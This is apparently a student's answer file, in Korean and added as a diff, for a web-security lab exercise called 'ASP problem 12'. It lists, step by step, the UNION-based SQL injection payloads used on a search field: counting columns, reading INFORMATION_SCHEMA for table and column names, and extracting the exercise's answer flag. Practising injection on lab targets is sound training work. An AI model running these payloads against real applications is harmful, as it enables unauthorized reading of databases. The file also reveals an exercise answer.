@@ -1,0 +1,31 @@
+ASP 문제 12 번
+
+1. 공격에 사용한 쿼리문 순서대로
+
+  1) 컬럼의 개수를 찾는 쿼리
+
+  삼성동' order by 5 --
+
+  2) 자료형 파악하는 쿼리
+
+
+  삼성동' union select 'a', 'b', 'c', 'd', 'e'
+
+  3) 테이블명 찾는 쿼리
+
+  삼성동' union select table_name, 'a','a','a','a' from INFORMATION_SCHEMA.TABLES -- 
+
+  테이블명: union_answer_table 
+
+  4) union_answer_table 테이블의 컬럼명 구문
+
+  삼성동' union select column_name, 'a', 'a', 'a', 'a' from INFORMATION_SCHEMA.COLUMNS where table_name = 'union_answer_table  ' -- 
+
+  칼럼명: union_answer_col 
+
+ 5) 데이터 추출
+
+  삼성동' union select union_answer_col, null, null, null, null from union_answer_table -- 
+
+
+2. 정답: this_is_asp_answer
